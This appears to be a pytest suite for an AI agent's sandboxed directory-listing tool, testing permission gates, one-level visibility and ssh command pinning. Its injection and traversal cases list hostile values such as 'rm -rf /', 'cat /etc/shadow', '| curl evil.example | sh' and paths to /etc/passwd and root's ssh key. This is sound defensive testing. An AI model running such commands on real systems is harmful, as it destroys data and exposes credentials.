"""
L14 cheat guard — the snapshot primitive's command surface.

The agent's ONLY interaction with a compute env (in v0) is the snapshot
primitive, which runs a single `find` invocation with a fixed `-printf`
template and `-maxdepth 1` (one-level visibility). These tests pin:

  - the LITERAL argv (local) and LITERAL remote-shell string (ssh) — any
    code change that introduces a new shell pattern fails CI
  - the one-level visibility contract (no recursion past depth 1)
  - permission gate fires BEFORE subprocess for unauthorized paths
  - permission gate refuses dirs whose permissions[] don't include the
    operation's required token
  - shell injection in path is neutralized by shlex.quote
  - no subprocess calls happen OTHER than the whitelisted find/ssh
  - unknown project / compute_env fail cleanly
  - schema typos / unknown permission tokens refused at load
  - happy path local snapshot returns the expected shape

The schema (post-2026-05-31 redesign): list-of-named-blocks at both
compute_env and project levels; per-dir access lives at
projects[].compute_env_access[].directories[] with a permissions[] LIST.
See agent/skills/projects_access.yaml.example for the full annotated shape.

If you're adding a new primitive (upload, download, hpc_run), follow the
same pattern: write the pinning test FIRST, then the implementation, then
the cheat-guard tests under this directory.
"""
from __future__ import annotations

import shlex
import subprocess
from pathlib import Path
from unittest.mock import MagicMock

import pytest
import yaml

from agent.skills import compute_access, snapshot
from agent.skills.compute_access import PermissionDenied


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

def _write_access(tmp_path: Path, access: dict) -> Path:
    p = tmp_path / "projects_access.yaml"
    p.write_text(yaml.safe_dump(access))
    return p


def _make_access(proj_dir: Path, *, env_type: str = "local",
                 permissions: list[str] = None,
                 host: str = "fake.example.com",
                 user: str = "u") -> dict:
    """Build a minimal access dict in the NEW schema shape: list-of-named-
    blocks at every level, permissions as a list at the project's dir
    entries."""
    perms = permissions if permissions is not None else ["file_name_only"]
    env_block: dict = {"name": "laptop", "type": env_type,
                       "container_upload_target": None}
    if env_type == "ssh":
        env_block.update({"host": host, "user": user})
    return {
        "compute_envs": [env_block],
        "projects": [
            {
                "name": "myproj",
                "description": "test fixture",
                "compute_env_access": [
                    {
                        "compute_env": "laptop",
                        "directories": [
                            {"path": str(proj_dir), "permissions": perms,
                             "description": "test dir"},
                        ],
                    },
                ],
            },
        ],
    }


@pytest.fixture
def _local_access(tmp_path):
    """A complete LOCAL compute_env config with file_name_only on tmp_path.

    Layout chosen to exercise the one-level visibility contract:
      proj/
        README.md            ← TOP-level file, visible
        a.fq.gz              ← TOP-level file, visible
        b.fq.gz              ← TOP-level file, visible
        samples/             ← TOP-level dir,  visible AS A NAME
          deep.fq.gz         ← NOT visible from proj/ (depth=2)
    """
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    (proj_dir / "README.md").write_text("hi")
    (proj_dir / "a.fq.gz").write_bytes(b"x" * 100)
    (proj_dir / "b.fq.gz").write_bytes(b"y" * 200)
    (proj_dir / "samples").mkdir()
    (proj_dir / "samples" / "deep.fq.gz").write_bytes(b"z" * 50)
    access = _make_access(proj_dir)
    return _write_access(tmp_path, access), proj_dir


# ---------------------------------------------------------------------------
# 1. Command-shape pinning — the literal subprocess argv must match
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_local_mode_uses_no_subprocess(tmp_path, monkeypatch):
    """The local mode emits ZERO subprocess calls — pure pathlib walk. This
    minimizes the security surface to nothing-at-all for local snapshots.
    Pin via a fail-on-any-subprocess monkeypatch."""
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    (proj_dir / "a.fq").write_text("x")

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append(a) or MagicMock())

    entries = snapshot._local_walk(str(proj_dir))
    assert len(entries) >= 2  # root + a.fq
    assert called == [], \
        f"local mode invoked subprocess: {called!r}"


@pytest.mark.integration
def test_ssh_remote_cmd_is_pinned():
    """The remote-shell string for ssh-mode snapshot MUST be exactly this
    shape. The path is shlex.quote'd (no quotes added for shell-safe
    strings; quotes added when adversarial), the printf template is
    shlex.quote'd (always quoted — contains backslash). `-maxdepth 1`
    enforces the one-level visibility contract on the remote side. Any
    deviation fails CI as a forcing function for a contract review."""
    cmd = snapshot._ssh_remote_cmd("/scratch/me/proj")
    # /scratch/me/proj has no shell metacharacters → shlex.quote returns it
    # AS-IS. The printf template contains backslashes → shlex.quote single-
    # quotes it. `-maxdepth 1` is a literal find flag (no shell semantics).
    expected = (
        "find /scratch/me/proj -maxdepth 1 '(' -type f -o -type d ')' "
        "-printf '%p\\t%s\\t%T@\\t%y\\n'"
    )
    assert cmd == expected, \
        f"ssh remote cmd shifted unexpectedly: {cmd!r}"


@pytest.mark.integration
def test_ssh_argv_includes_batch_mode_no_password_prompt():
    """ssh must run in BatchMode so a missing ssh-agent fails fast rather
    than interactively prompting (which would deadlock an MCP-driven agent
    that has no stdin)."""
    argv = snapshot._ssh_argv(
        {"host": "h.example", "user": "u"}, "find /x")
    assert "-o" in argv and "BatchMode=yes" in argv, \
        f"ssh argv missing BatchMode=yes: {argv!r}"


# ---------------------------------------------------------------------------
# 2. Shell-injection safety — adversarial paths in the config must not escape
# ---------------------------------------------------------------------------

@pytest.mark.integration
@pytest.mark.parametrize("evil_path", [
    "/scratch/x; rm -rf /",
    "/scratch/x && cat /etc/shadow",
    "/scratch/x`whoami`",
    "/scratch/x$(id)",
    "/scratch/x'\"&&",
    "/scratch/x | curl evil.example | sh",
])
def test_ssh_remote_cmd_neutralizes_path_injection(evil_path):
    """Even if the user (or a corrupted manifest) declared an adversarial
    path string, the shlex.quote in _ssh_remote_cmd MUST keep it inside a
    single-quoted shell argument. The metacharacters appear as literal
    characters to `find`, NOT as shell metacharacters."""
    cmd = snapshot._ssh_remote_cmd(evil_path)
    # The path appears exactly ONCE, inside a properly-quoted shell argument.
    # `shlex.quote` returns either '/path' (single-quoted) or escapes inline.
    quoted = shlex.quote(evil_path)
    assert quoted in cmd, \
        f"path not properly shlex.quote'd in: {cmd!r}"
    # And the LITERAL evil-looking characters must NOT appear UNQUOTED in
    # the rest of the command: i.e. the first occurrence in cmd is inside
    # the quoted region.
    # Strong proof: re-parse the cmd back to argv and confirm only ONE arg
    # holds the evil string.
    parsed = shlex.split(cmd)
    assert evil_path in parsed, \
        f"shlex round-trip lost the path verbatim: parsed={parsed!r}"
    # And no other argv element is the bare evil chars (they're all literal
    # `find` flags, parens, printf template).
    contaminants = [a for a in parsed if any(c in a for c in [";", "&&", "|", "`"])
                                          and a != evil_path]
    assert not contaminants, \
        f"shell metachars leaked out of the path: {contaminants!r}"


# ---------------------------------------------------------------------------
# 3. Permission gate — fires before any subprocess
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_unauthorized_path_refused_before_subprocess(_local_access, monkeypatch):
    """A directory entry pointing at an UNAUTHORIZED path gets rejected at
    the gate. NO subprocess.run is called. (We mutate the project's
    declared directory to /etc — the gate's longest-prefix match has
    nothing to bind to, so it refuses.)"""
    access_path, _proj_dir = _local_access
    data = yaml.safe_load(access_path.read_text())
    # Mutate the project's declared directory to point at /etc — but the
    # snapshot path is what gets gated, and the new schema derives the
    # snapshot list FROM the project's directories[] list, so a path
    # outside any of those won't match. We simulate this by handing
    # check_permission an outside path directly.
    data["projects"][0]["compute_env_access"][0]["directories"] = [
        {"path": "/some/declared/elsewhere",
         "permissions": ["file_name_only"], "description": "x"},
    ]
    access_path.write_text(yaml.safe_dump(data))

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    # The validator passes (directory is well-formed); the gate runs at
    # check_permission time. Drive check_permission with a path NOT in the
    # project's directories[] list and assert it refuses.
    access = compute_access.load_access(access_path)
    project = compute_access.get_project("myproj", access)
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(project, "laptop", "/etc", "snapshot")
    assert "not authorized" in str(exc.value)
    assert called == [], \
        f"subprocess.run was called despite permission denial: {called!r}"


@pytest.mark.integration
def test_wrong_permission_refused(_local_access, monkeypatch):
    """A directory declared with permissions=[upload] does NOT satisfy the
    snapshot operation (which requires `file_name_only`). The token must
    be present IN THE LIST — exact match, not a lattice."""
    access_path, proj_dir = _local_access
    data = yaml.safe_load(access_path.read_text())
    data["projects"][0]["compute_env_access"][0]["directories"][0]["permissions"] = ["upload"]
    access_path.write_text(yaml.safe_dump(data))

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    result = snapshot.snapshot_project("myproj", access_path=str(access_path))
    # Snapshot is a no-op when no dir grants file_name_only — surfaces as
    # a clean error dict, not an exception.
    assert "error" in result, f"expected error dict, got {result!r}"
    assert "file_name_only" in result["error"]
    assert called == []


@pytest.mark.integration
def test_upload_permission_does_not_satisfy_snapshot_via_gate():
    """Direct check_permission test — confirms the exact-match semantics on
    the permissions[] list, independent of the snapshot wrapper."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/scratch/me/proj/", "permissions": ["upload"]},
            ]},
        ],
    }
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(project, "e", "/scratch/me/proj/", "snapshot")
    assert "permissions ['upload']" in str(exc.value) or "['upload']" in str(exc.value)
    assert "requires 'file_name_only'" in str(exc.value)


@pytest.mark.integration
@pytest.mark.parametrize("escape", [
    "/proj/safe/../../etc/passwd",
    "/proj/safe/../../../root/.ssh/id_rsa",
    "/proj/safe/./../../etc/shadow",
    "/proj/safe/sub/../../../etc/passwd",
])
def test_check_permission_refuses_traversal_out_of_an_authorized_dir(escape):
    """check_permission must hold ON ITS OWN — it is the security boundary its
    own docstring says every primitive calls first.

    The bug (tier 7): it prefix-matched the RAW string, so '/proj/safe/../../
    etc/passwd' was AUTHORIZED against a '/proj/safe' grant — the string does
    start with the prefix, even though the path it names is /etc/passwd. Nothing
    exploited it, because all three callers happen to pre-validate with a
    SEPARATE checker. That is precisely the trap this audit keeps finding: the
    gate that claims authority was leaning on a check it does not own, and one
    caller forgetting that check is a full escape out of the sandbox."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/proj/safe", "permissions": ["upload", "download", "exec"]},
            ]},
        ],
    }
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(project, "e", escape, "upload")
    assert "traversal" in str(exc.value)


@pytest.mark.integration
@pytest.mark.parametrize("path", [
    "/proj/safe/f.txt",
    "/proj/safe/./f.txt",       # a '.' segment must still resolve, not refuse
    "/proj/safe//sub//f.txt",   # duplicate slashes are benign
    "/proj/safe/",
])
def test_check_permission_still_allows_benign_nonliteral_paths(path):
    """The traversal guard must not become alarm-noise: normalizing is not
    refusing. '.' segments and duplicate slashes name the same real path, so
    they stay authorized."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/proj/safe", "permissions": ["upload"]},
            ]},
        ],
    }
    assert compute_access.check_permission(project, "e", path, "upload")["path"] == "/proj/safe"


@pytest.mark.integration
def test_check_permission_prefix_must_not_straddle_a_name_boundary():
    """'/proj/safe_evil' must NOT match a '/proj/safe' grant — a prefix match on
    strings would let an attacker-named sibling dir inherit the grant."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/proj/safe", "permissions": ["upload"]},
            ]},
        ],
    }
    with pytest.raises(PermissionDenied):
        compute_access.check_permission(project, "e", "/proj/safe_evil/f.txt", "upload")


@pytest.mark.integration
def test_multiple_permissions_on_same_dir_satisfies_both():
    """A directory declared `permissions: [file_name_only, upload]` MUST
    satisfy BOTH operations. The list-based shape's whole point."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/scratch/me/proj/",
                 "permissions": ["file_name_only", "upload"]},
            ]},
        ],
    }
    # snapshot is satisfied
    matched = compute_access.check_permission(
        project, "e", "/scratch/me/proj/", "snapshot")
    assert matched.get("path") == "/scratch/me/proj/"
    # upload would be satisfied too — when OPERATION_REQUIRES["upload"] is
    # wired. Pin the contract via direct membership check on the matched dir.
    assert "upload" in matched["permissions"]


@pytest.mark.integration
def test_relative_path_refused(_local_access):
    """The gate must reject non-absolute paths — relative paths have no
    meaning at the security boundary."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/x", "permissions": ["file_name_only"]},
            ]},
        ],
    }
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(project, "e", "relative/path", "snapshot")
    assert "absolute" in str(exc.value).lower()


@pytest.mark.integration
def test_path_outside_authorized_subdir_refused():
    """Longest-prefix match means a path INSIDE an authorized dir is OK.
    A sibling path NOT inside the authorized dir is NOT OK."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/scratch/me/proj/", "permissions": ["file_name_only"]},
            ]},
        ],
    }
    # Inside the authorized dir → matched.
    compute_access.check_permission(project, "e", "/scratch/me/proj/sub/file", "snapshot")
    # Sibling → denied (no matching entry).
    with pytest.raises(PermissionDenied):
        compute_access.check_permission(project, "e", "/scratch/me/other/", "snapshot")
    # Parent of authorized dir → denied (the parent isn't authorized; just
    # the specific child).
    with pytest.raises(PermissionDenied):
        compute_access.check_permission(project, "e", "/scratch/me/", "snapshot")


@pytest.mark.integration
def test_more_specific_dir_wins():
    """When both a parent and child dir are declared in the same project,
    the more specific (child) one wins for paths under the child."""
    project = {
        "name": "p", "compute_env_access": [
            {"compute_env": "e", "directories": [
                {"path": "/scratch/me/proj/", "permissions": ["file_name_only"]},
                {"path": "/scratch/me/proj/uploads/", "permissions": ["upload"]},
            ]},
        ],
    }
    # A path inside uploads/ sees the child entry's permissions (upload-only).
    with pytest.raises(PermissionDenied) as exc:
        compute_access.check_permission(
            project, "e", "/scratch/me/proj/uploads/x.sif", "snapshot")
    assert "['upload']" in str(exc.value) or "permissions ['upload']" in str(exc.value)
    # A path inside the parent (but outside the child) sees the parent's
    # permissions (file_name_only).
    matched = compute_access.check_permission(
        project, "e", "/scratch/me/proj/samples/a.fq", "snapshot")
    assert matched.get("path") == "/scratch/me/proj/"


# ---------------------------------------------------------------------------
# 4. No-other-subprocess-calls — pin the call surface
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_local_snapshot_emits_no_subprocess(_local_access, monkeypatch):
    """Local-mode snapshot emits ZERO subprocess calls (pure pathlib).
    Monkeypatch subprocess.run; assert it was never invoked."""
    access_path, proj_dir = _local_access

    called = []
    monkeypatch.setattr(subprocess, "run",
                        lambda *a, **kw: called.append((a, kw)) or MagicMock())

    result = snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert "entries" in result, f"snapshot failed: {result}"
    assert called == [], \
        f"local mode invoked subprocess: {called!r}"


@pytest.mark.integration
def test_ssh_snapshot_emits_only_ssh_subprocess(_local_access, monkeypatch):
    """SSH-mode snapshot emits exactly ONE subprocess call per snapshot path,
    and that call is `ssh ...` — nothing else (no curl, whoami, python,
    rm, etc.). The remote command (passed as one argv element) is verified
    by the test_ssh_remote_cmd_is_pinned test."""
    access_path, proj_dir = _local_access

    # Switch the env type to ssh so we exercise the subprocess path.
    data = yaml.safe_load(access_path.read_text())
    data["compute_envs"][0]["type"] = "ssh"
    data["compute_envs"][0]["host"] = "fake.example.com"
    data["compute_envs"][0]["user"] = "u"
    access_path.write_text(yaml.safe_dump(data))

    seen: list[list[str]] = []
    fake_result = MagicMock(returncode=0, stdout="", stderr="")
    def _spy(argv, *a, **kw):
        seen.append(list(argv) if isinstance(argv, list) else [argv])
        return fake_result
    monkeypatch.setattr(subprocess, "run", _spy)

    snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert seen, "expected at least one subprocess call in ssh mode"
    for argv in seen:
        head = argv[0] if argv else ""
        assert head == "ssh", \
            f"unwhitelisted subprocess call in ssh mode: {argv!r}"


# ---------------------------------------------------------------------------
# 5. Clean-error contract — unknown project / env / etc.
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_unknown_project_clean_error(_local_access):
    access_path, _ = _local_access
    with pytest.raises(KeyError) as exc:
        snapshot.snapshot_project("does_not_exist", access_path=str(access_path))
    assert "not found" in str(exc.value)


@pytest.mark.integration
def test_unknown_compute_env_clean_error(tmp_path):
    """The validator catches a dangling compute_env reference up front —
    cleaner than letting the snapshot call discover it at runtime."""
    access = {
        "compute_envs": [{"name": "a", "type": "local",
                          "container_upload_target": None}],
        "projects": [{
            "name": "bad_proj",
            "compute_env_access": [
                {"compute_env": "nonexistent",
                 "directories": [{"path": "/x",
                                  "permissions": ["file_name_only"]}]},
            ],
        }],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "doesn't match any compute_envs" in str(exc.value)


@pytest.mark.integration
def test_unknown_permission_in_config_refused(tmp_path):
    """A typo in a permission token should fail at load — silent default-
    to-none would be a security regression by ergonomic surprise."""
    access = {
        "compute_envs": [{"name": "e", "type": "local",
                          "container_upload_target": None}],
        "projects": [{
            "name": "p",
            "compute_env_access": [
                {"compute_env": "e", "directories": [
                    {"path": "/x",
                     "permissions": ["filename_only"]},  # missing underscore
                ]},
            ],
        }],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "unknown token" in str(exc.value).lower()


@pytest.mark.integration
def test_duplicate_compute_env_name_refused(tmp_path):
    """Two compute_envs with the same `name` would create lookup ambiguity.
    Refuse at load."""
    access = {
        "compute_envs": [
            {"name": "dup", "type": "local", "container_upload_target": None},
            {"name": "dup", "type": "local", "container_upload_target": None},
        ],
        "projects": [],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "duplicate" in str(exc.value).lower()


@pytest.mark.integration
def test_old_singular_permission_shape_refused(tmp_path):
    """The old shape used `permission: X` (singular). New shape is
    `permissions: [X]`. Pin that the old form fails loudly at load — no
    silent coercion. (Cleaner mental model; back-compat baggage avoided.)"""
    access = {
        "compute_envs": [{"name": "e", "type": "local",
                          "container_upload_target": None}],
        "projects": [{
            "name": "p", "compute_env_access": [
                {"compute_env": "e", "directories": [
                    {"path": "/x", "permission": "file_name_only"},  # singular
                ]},
            ],
        }],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    # The validator looks for `permissions:` (plural, list); missing is a
    # clear error.
    assert "permissions" in str(exc.value)


@pytest.mark.integration
def test_container_upload_target_missing_upload_refused(tmp_path):
    """`container_upload_target` is a structural slot — its permissions
    MUST INCLUDE `upload` (else the slot doesn't mean what it says).
    Other tokens beyond `upload` are allowed (combining tokens is the
    whole point of permissions being a list).

    Pin the strict floor: missing `upload` → fail-closed at load."""
    access = {
        "compute_envs": [{
            "name": "e", "type": "local",
            "container_upload_target": {
                "path": "/uploads", "permissions": ["file_name_only"],
                "description": "missing upload",
            },
        }],
        "projects": [],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    with pytest.raises(compute_access.ConfigError) as exc:
        compute_access.load_access(p)
    assert "container_upload_target" in str(exc.value)
    assert "must include" in str(exc.value)
    assert "upload" in str(exc.value)


@pytest.mark.integration
def test_container_upload_target_extra_permissions_allowed(tmp_path):
    """Inverse: `permissions: [file_name_only, upload]` IS valid — `upload`
    is present, extra tokens are fine. Users can ask the agent to BOTH see
    AND write the container directory."""
    access = {
        "compute_envs": [{
            "name": "e", "type": "local",
            "container_upload_target": {
                "path": "/uploads",
                "permissions": ["file_name_only", "upload"],
                "description": "list AND upload",
            },
        }],
        "projects": [],
    }
    p = tmp_path / "access.yaml"
    p.write_text(yaml.safe_dump(access))
    # Should parse cleanly — `upload` is in the list, so the must_include
    # contract is satisfied; the extra `file_name_only` is fine.
    loaded = compute_access.load_access(p)
    env = compute_access.get_compute_env("e", loaded)
    assert env["container_upload_target"]["permissions"] == [
        "file_name_only", "upload"]


# ---------------------------------------------------------------------------
# 6. Happy path — end-to-end local snapshot
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_snapshot_returns_expected_entries(_local_access):
    """End-to-end: real config, real tmp_path data. Confirms the local
    walk yields the TOP-LEVEL contents (root + immediate children) with
    correct sizes/types, tagged with compute_env."""
    access_path, proj_dir = _local_access
    result = snapshot.snapshot_project("myproj", access_path=str(access_path))

    assert result["project"] == "myproj"
    assert result["compute_envs"] == ["laptop"]
    # Expected: root + 3 files (README.md, a.fq.gz, b.fq.gz) + 1 dir (samples/)
    assert result["entry_count"] == 5, \
        f"expected 5 top-level entries, got {result['entry_count']}: {result['entries']!r}"
    paths = {e["path"] for e in result["entries"]}
    assert any(p.endswith("a.fq.gz") for p in paths)
    assert any(p.endswith("b.fq.gz") for p in paths)
    assert any(p.endswith("README.md") for p in paths)
    # The subdir is visible by NAME (as a dir entry).
    samples_entry = next(
        (e for e in result["entries"] if e["path"].endswith("/samples")), None)
    assert samples_entry is not None and samples_entry["type"] == "dir"
    # Sizes are captured correctly.
    a = next(e for e in result["entries"] if e["path"].endswith("a.fq.gz"))
    assert a["size"] == 100
    assert a["type"] == "file"
    # Every entry is tagged with the compute_env it came from.
    assert all(e["compute_env"] == "laptop" for e in result["entries"])
    # per_env_counts reflects the per-env partition.
    assert result["per_env_counts"] == {"laptop": 5}


@pytest.mark.integration
def test_snapshot_does_not_recurse_into_subdirs(_local_access):
    """The one-level visibility contract: file_name_only on a dir grants
    visibility into that dir's IMMEDIATE contents only. Subdir interiors
    are invisible — the agent sees the subdir's NAME but not its files.

    This is the explicit pin for the security model: minimize the surface
    area the agent has access to. A single declaration cannot snowball
    into a full subtree walk. To see deeper, declare the subdir as its
    own directory entry."""
    access_path, proj_dir = _local_access
    result = snapshot.snapshot_project("myproj", access_path=str(access_path))
    paths = {e["path"] for e in result["entries"]}

    # The file at depth=2 (proj/samples/deep.fq.gz) MUST NOT appear.
    assert not any("deep.fq.gz" in p for p in paths), (
        f"snapshot recursed into a subdir — found deep.fq.gz in entries. "
        f"file_name_only is supposed to be one-level visibility only. "
        f"Entries: {sorted(paths)!r}")

    # And nothing in the entries is deeper than 1 level below the root.
    root = str(proj_dir)
    for p in paths:
        if p == root:
            continue
        rel = p[len(root)+1:] if p.startswith(root + "/") else p
        assert "/" not in rel, \
            f"entry {p!r} is deeper than 1 level under {root!r} (rel={rel!r})"


@pytest.mark.integration
def test_ssh_remote_cmd_carries_maxdepth_1(_local_access):
    """The non-recursion contract on the remote side. `find -maxdepth 1`
    is the literal mechanism. A code change that drops `-maxdepth 1`
    silently regresses to full subtree walks — pin it independently of
    the full literal-shape test so the diff is unmistakable."""
    cmd = snapshot._ssh_remote_cmd("/scratch/me/proj")
    assert "-maxdepth 1" in cmd, \
        f"ssh remote cmd missing -maxdepth 1: {cmd!r}"
    # And the literal token order: `find <path> -maxdepth 1` (maxdepth
    # before the type predicates, per find's standard usage).
    assert cmd.startswith("find /scratch/me/proj -maxdepth 1"), \
        f"-maxdepth 1 not in expected position in: {cmd!r}"


# ---------------------------------------------------------------------------
# Actionable-failure contract — when ssh fails (no open ControlMaster
# session, host unreachable, etc.), the agent returns an actionable HINT
# telling the user what to do, not an opaque rc=255.
# ---------------------------------------------------------------------------

@pytest.mark.integration
@pytest.mark.parametrize("stderr,expected_in_hint", [
    # ControlMaster not open + BatchMode → "Permission denied"
    ("user1@hpc-agent: Permission denied (publickey,password,keyboard-interactive).",
     "open a terminal and run"),
    # Remote drop / no session
    ("Connection closed by remote host", "open a terminal and run"),
    # Bad ssh config alias
    ("ssh: Could not resolve hostname hpc-agent: Name or service not known",
     "can't resolve hostname"),
    # Off-VPN
    ("ssh: connect to host hpc_cluster.example.edu port 22: Connection timed out",
     "timed out"),
])
def test_ssh_failure_hint_is_actionable(stderr, expected_in_hint):
    """Pin the user-facing hint shape for common ssh failure modes. The
    user types `snapshot_project(name)` once and gets back a concrete
    "do X next" message — not a raw subprocess rc=255 dump."""
    hint = snapshot._ssh_failure_hint(stderr, host="hpc-agent")
    assert hint is not None, f"no hint emitted for stderr={stderr!r}"
    assert expected_in_hint.lower() in hint.lower(), \
        f"hint missing expected text: {hint!r}"


@pytest.mark.integration
def test_ssh_failure_hint_no_false_positive_on_clean_stderr():
    """A clean ssh stderr (e.g. empty, or a normal warning) MUST NOT
    generate a 'no open session' hint. Pin that the detector is keyed on
    specific patterns, not 'any stderr at all'."""
    assert snapshot._ssh_failure_hint("", "hpc-agent") is None
    assert snapshot._ssh_failure_hint(
        "Warning: Permanently added 'hpc-agent' to known_hosts.",
        "hpc-agent") is None


@pytest.mark.integration
def test_ssh_snapshot_failure_includes_hint_field(monkeypatch, _local_access):
    """End-to-end: when an ssh snapshot call fails with a recognized
    failure pattern, the resulting snapshot record's `errors[]` entry
    includes a `hint` field — the user-visible 'run `ssh hpc-agent` first'
    message. Pin the field's presence at the snapshot_project return level
    (not just the helper) so the contract holds through the call graph."""
    access_path, _ = _local_access
    # Switch the env to ssh so we exercise the subprocess path.
    data = yaml.safe_load(access_path.read_text())
    data["compute_envs"][0]["type"] = "ssh"
    data["compute_envs"][0]["host"] = "hpc-agent"
    data["compute_envs"][0]["user"] = "u"
    access_path.write_text(yaml.safe_dump(data))

    # Simulate ssh failing with Permission denied (the "no open session" case).
    fake_result = MagicMock(
        returncode=255, stdout="",
        stderr="u@hpc-agent: Permission denied (publickey,password).")
    monkeypatch.setattr(subprocess, "run", lambda *a, **kw: fake_result)

    rec = snapshot.snapshot_project("myproj", access_path=str(access_path))
    assert "errors" in rec, f"expected errors[] in record: {rec!r}"
    err = rec["errors"][0]
    assert "hint" in err, f"no hint in error entry: {err!r}"
    assert "ssh hpc-agent" in err["hint"], \
        f"hint missing the action: {err['hint']!r}"


# ---------------------------------------------------------------------------
# 7. MCP wrapper — clean error surface (no raw exception leaks to the wire)
# ---------------------------------------------------------------------------

@pytest.mark.integration
def test_mcp_wrapper_translates_permission_denied_to_error_dict(monkeypatch, tmp_path):
    """The MCP tool wrapper must catch PermissionDenied / ConfigError /
    FileNotFoundError / KeyError and return {error: ...} — never propagate
    a raw exception to the wire (which would crash the MCP transport)."""
    from agent import mcp_server as m

    # Point at a missing manifest by patching default_access_path.
    monkeypatch.setattr(compute_access, "default_access_path",
                        lambda: tmp_path / "nonexistent.yaml")
    result = m.snapshot_project("anything")
    assert "error" in result, f"MCP wrapper leaked exception: {result!r}"
    assert "FileNotFoundError" in result["error"]
